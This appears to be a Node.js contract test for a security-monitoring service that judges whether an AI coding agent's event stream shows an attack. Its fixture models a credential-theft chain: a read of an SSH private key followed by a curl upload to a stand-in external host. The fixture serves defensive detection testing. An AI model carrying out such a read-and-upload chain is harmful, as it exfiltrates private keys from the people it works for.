#!/usr/bin/env node

import assert from 'node:assert/strict';
import {
  compositePrompt,
  deterministicSyntheticDecision,
  deterministicSupplyChainDecision,
  parseCompositeDecision,
} from '../apps/api/dist/security-monitoring/stream-worker-main.js';
import {
  collapseCompositeJudgmentRevisions,
} from '../apps/api/dist/security-monitoring/streaming-finding.service.js';

const batch = {
  schemaVersion: 'anysentry.risk_analysis_batch.v1',
  episodeId: 'ep_test',
  revision: 2,
  supersedesRevision: 1,
  evidenceFingerprint: 'evidence_test',
  triggerReason: 'critical_evidence',
  tenantId: 'default',
  environmentId: 'test',
  workspaceId: 'ws_test',
  workspacePath: '/workspace/project',
  agentCorrelationId: 'agc_test',
  agentType: 'a3s code',
  sessionId: 'session-test',
  traceIds: ['trace-test'],
  windowStart: 1_785_000_000_000,
  windowEnd: 1_785_000_030_000,
  generatedAt: 1_785_000_040_000,
  candidateType: 'sensitive_data_egress',
  decisionPath: 'composite_judge',
  ruleVersion: 'composite-risk-v2',
  decisionSource: 'composite_judge',
  synthetic: false,
  evidence: [
    {
      eventId: 'evt_read',
      eventTime: 1_785_000_000_000,
      eventKind: 'FileAccess',
      operation: 'file_read',
      subject: 'file /home/test/.ssh/id_rsa',
      resource: '/home/test/.ssh/id_rsa',
      dangerous: false,
      sensitiveResource: true,
      externalDestination: false,
      failed: false,
      argvTruncated: false,
      behaviorStage: 'credential_access',
      platformRuntime: false,
      synthetic: false,
      judgment: {
        stage: 'L2',
        status: 'succeeded',
        verdict: 'allow',
        reason: 'single read may be legitimate',
        latencyMs: 800,
        revision: 1,
      },
    },
    {
      eventId: 'evt_egress',
      eventTime: 1_785_000_030_000,
      eventKind: 'Egress',
      operation: 'egress',
      subject: 'curl https://unknown.example/upload',
      destination: 'unknown.example',
      dangerous: false,
      sensitiveResource: false,
      externalDestination: true,
      failed: false,
      command: 'curl https://unknown.example/upload',
      executable: 'curl',
      argvTruncated: false,
      behaviorStage: 'external_egress',
      platformRuntime: false,
      synthetic: false,
    },
  ],
  shadow: true,
};

const prompt = compositePrompt(batch);
assert.match(prompt, /<<UNTRUSTED_EVIDENCE>>/);
assert.match(prompt, /evt_read/);
assert.match(prompt, /singleEventJudgment/);
assert.match(prompt, /Return one JSON object/i);
assert.match(prompt, /platformRuntime/);
assert.match(prompt, /confirmed_attack/);

const decision = parseCompositeDecision(JSON.stringify({
  classification: 'confirmed_attack',
  verdict: 'block',
  severity: 'critical',
  confidence: 0.91,
  attackType: 'credential exfiltration',
  reason: 'A sensitive credential read was followed by external egress.',
  evidenceEventIds: ['evt_read', 'evt_egress', 'evt_invented'],
}), batch);
assert.equal(decision.verdict, 'block');
assert.equal(decision.classification, 'confirmed_attack');
assert.equal(decision.confidence, 0.91);
assert.deepEqual(decision.evidenceEventIds, ['evt_read', 'evt_egress']);

const syntheticDecision = parseCompositeDecision(JSON.stringify({
  classification: 'confirmed_attack',
  verdict: 'block',
  severity: 'critical',
  confidence: 0.95,
  attackType: 'credential exfiltration',
  reason: 'The fixture resembles a credential exfiltration chain.',
  evidenceEventIds: ['evt_read', 'evt_egress'],
}), { ...batch, synthetic: true });
assert.equal(syntheticDecision.classification, 'simulation');
assert.equal(syntheticDecision.verdict, 'allow');
assert.equal(syntheticDecision.severity, 'low');
assert.equal(syntheticDecision.attackType, 'none');

const offlineSyntheticDecision = deterministicSyntheticDecision({ ...batch, synthetic: true });
assert.equal(offlineSyntheticDecision.classification, 'simulation');
assert.equal(offlineSyntheticDecision.verdict, 'allow');
assert.equal(offlineSyntheticDecision.confidence, 1);
assert.deepEqual(offlineSyntheticDecision.evidenceEventIds, ['evt_read', 'evt_egress']);
assert.throws(
  () => deterministicSyntheticDecision(batch),
  /requires a synthetic episode/,
);

assert.throws(
  () => parseCompositeDecision('{"verdict":"allow"} trailing text', batch),
  /JSON/,
);
assert.throws(
  () => parseCompositeDecision(JSON.stringify({
    classification: 'suspicious',
    verdict: 'escalate',
    severity: 'high',
    confidence: 0.8,
    reason: 'uncertain',
    evidenceEventIds: [],
  }), batch),
  /invalid verdict/,
);
assert.throws(
  () => parseCompositeDecision(JSON.stringify({
    classification: 'suspicious',
    verdict: 'block',
    severity: 'high',
    confidence: 0.8,
    reason: 'worth investigating but not proven',
    evidenceEventIds: ['evt_read', 'evt_egress'],
  }), batch),
  /inconsistent classification/,
);

const completedRevision = {
  schemaVersion: 'anysentry.stream_finding.v1',
  findingType: 'composite_judgment',
  findingId: 'composite-ep_test-5',
  episodeId: 'ep_test',
  revision: 5,
  evidenceFingerprint: 'fingerprint-5',
  tenantId: 'default',
  environmentId: 'test',
  workspaceId: 'ws_test',
  workspacePath: '/workspace/project',
  agentCorrelationId: 'agc_test',
  agentType: 'a3s code',
  sessionId: 'session-test',
  traceIds: ['trace-test'],
  windowStart: 1_785_000_000_000,
  windowEnd: 1_785_000_030_000,
  judgedAt: 1_785_000_040_000,
  status: 'succeeded',
  verdict: 'allow',
  severity: 'medium',
  confidence: 0.7,
  classification: 'suspicious',
  attackType: 'suspicious chain',
  reason: 'The completed revision remains the active conclusion.',
  evidenceEventIds: ['evt_read', 'evt_egress'],
  evidence: batch.evidence,
  model: 'deepseek-v4-flash',
  latencyMs: 2_000,
  ruleVersion: 'composite-risk-v2',
  synthetic: false,
  shadow: true,
};
const pendingRevision = {
  ...completedRevision,
  findingId: 'composite-ep_test-6',
  revision: 6,
  evidenceFingerprint: 'fingerprint-6',
  judgedAt: 1_785_000_050_000,
  status: 'pending',
  verdict: undefined,
  severity: undefined,
  confidence: undefined,
  classification: undefined,
  attackType: undefined,
  reason: undefined,
  evidenceEventIds: [],
  latencyMs: 1,
};
const [stableView] = collapseCompositeJudgmentRevisions([pendingRevision, completedRevision]);
assert.equal(stableView.status, 'succeeded', 'a pending revision must not replace the last completed conclusion');
assert.equal(stableView.classification, 'suspicious');
assert.equal(stableView.revision, 5);
assert.equal(stableView.updateRevision, 6);
assert.equal(stableView.updateStatus, 'pending');

const supplyChainBatch = {
  ...batch,
  episodeId: 'ep_supply_chain',
  candidateType: 'known_vulnerability_exploitation',
  decisionPath: 'deterministic_rule',
  ruleVersion: 'supply-chain-exploit-v1',
  evidence: [
    {
      ...batch.evidence[0],
      eventId: 'evt_component',
      behaviorStage: 'vulnerable_component_execution',
      runtimeVulnerabilities: [{
        findingId: 'finding-1',
        dependencySnapshotId: 'deps-1',
        vulnerabilityAssessmentId: 'va-1',
        ecosystem: 'npm',
        packageName: 'webpack',
        version: '5.98.0',
        vulnerabilityId: 'GHSA-test',
        aliases: [],
        confidence: 'high',
        matchBasis: 'node_modules path',
      }],
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_dangerous',
      behaviorStage: 'dangerous_exec',
      runtimeVulnerabilities: [],
    },
    {
      ...batch.evidence[0],
      eventId: 'evt_sensitive',
      behaviorStage: 'credential_access',
      runtimeVulnerabilities: [],
    },
    {
      ...batch.evidence[1],
      eventId: 'evt_external',
      runtimeVulnerabilities: [],
    },
  ],
};
const deterministicDecision = deterministicSupplyChainDecision(supplyChainBatch);
assert.equal(deterministicDecision.classification, 'confirmed_attack');
assert.equal(deterministicDecision.verdict, 'block');
assert.equal(deterministicDecision.evidenceEventIds.length, 4);
const syntheticSupplyChainDecision = deterministicSupplyChainDecision({
  ...supplyChainBatch,
  synthetic: true,
});
assert.equal(syntheticSupplyChainDecision.classification, 'simulation');
assert.equal(syntheticSupplyChainDecision.verdict, 'allow');

console.log('Streaming phase 2 composite judgment contract verification passed');
